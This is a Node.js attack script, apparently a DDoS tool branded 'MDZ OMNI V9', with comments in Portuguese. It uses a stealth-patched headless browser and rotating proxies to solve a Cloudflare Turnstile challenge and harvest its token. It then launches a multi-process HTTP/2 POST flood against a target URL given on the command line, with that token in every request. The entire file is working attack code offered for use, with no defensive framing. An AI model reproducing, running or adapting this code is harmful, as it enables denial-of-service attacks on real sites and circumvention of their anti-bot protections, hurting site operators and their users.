const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const cluster = require('cluster');
const http2 = require('http2');
const tls = require('tls');
const fs = require('fs');
const url = require('url');

puppeteer.use(StealthPlugin());

process.setMaxListeners(0);

const args = {
    target: process.argv[2],
    time: ~~process.argv[3],
    rate: ~~process.argv[4],
    threads: ~~process.argv[5],
    proxyFile: process.argv[6] || "proxy.txt"
};

const SITE_KEY = "0x4AAAAAACxsMU2VXTekcjwv";

if (cluster.isMaster) {
    console.log(`\x1b[1;31m  MDZ OMNI V9 \x1b[1;30m| \x1b[1;37m[PUPPETEER ENGINE ACTIVE]\x1b[0m`);
    for (let i = 0; i < args.threads; i++) cluster.fork();
    
    setTimeout(() => process.exit(0), args.time * 1000);
} else {
    startPuppeteerEngine();
}

async function startPuppeteerEngine() {
    const proxies = fs.readFileSync(args.proxyFile, 'utf-8').split('\n').filter(l => l.length > 5);
    
    // Inicia o navegador com Stealth para não ser detectado como Bot básico
    const browser = await puppeteer.launch({
        headless: "new",
        args: [
            '--no-sandbox',
            '--disable-setuid-sandbox',
            `--proxy-server=http://${proxies[Math.floor(Math.random() * proxies.length)]}`
        ]
    });

    const page = await browser.newPage();
    await page.setViewport({ width: 1920, height: 1080 });

    try {
        console.log(`[Thread ${process.pid}] Tentando resolver Turnstile em: ${args.target}`);
        
        // Navega até o alvo
        await page.goto(args.target, { waitUntil: 'networkidle2', timeout: 60000 });

        // Espera o Turnstile carregar e ser resolvido (ajuste o seletor se necessário)
        await page.waitForSelector('.cf-turnstile', { timeout: 30000 });
        
        // Aguarda o token ser gerado no input oculto
        const turnstileToken = await page.evaluate(async () => {
            // Loop para esperar o token aparecer (o Turnstile injeta após o check)
            return new Promise((resolve) => {
                const check = setInterval(() => {
                    const token = document.querySelector('[name="cf-turnstile-response"]')?.value;
                    if (token && token.length > 10) {
                        clearInterval(check);
                        resolve(token);
                    }
                }, 500);
            });
        });

        if (turnstileToken) {
            console.log(`\x1b[1;32m[Thread ${process.pid}] Token Obtido: ${turnstileToken.substring(0, 15)}...\x1b[0m`);
            
            // Agora que temos o TOKEN REAL, iniciamos o flood HTTP/2 por dentro dessa sessão
            startHighSpeedFlood(turnstileToken);
        }

    } catch (err) {
        console.log(`\x1b[1;31m[Thread ${process.pid}] Erro no Bypass: ${err.message}\x1b[0m`);
        await browser.close();
        startPuppeteerEngine(); // Reinicia em caso de erro
    }
}

function startHighSpeedFlood(token) {
    const parsed = url.parse(args.target);
    
    // Aqui entra a sua lógica TITAN V7 de flood HTTP/2
    // Mas agora enviando o cf-turnstile-response real obtido pelo Puppeteer
    setInterval(() => {
        const client = http2.connect(args.target, {
            settings: { maxConcurrentStreams: 1000 }
        });

        client.on('connect', () => {
            for (let i = 0; i < args.rate; i++) {
                const req = client.request({
                    ":method": "POST",
                    ":path": parsed.path,
                    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/122.0.0.0",
                    "cf-turnstile-response": token, // Token REAL aqui
                    "content-type": "application/x-www-form-urlencoded"
                });
                req.end(`cf-turnstile-response=${token}`);
            }
        });

        setTimeout(() => client.destroy(), 10000);
    }, 1000);
}
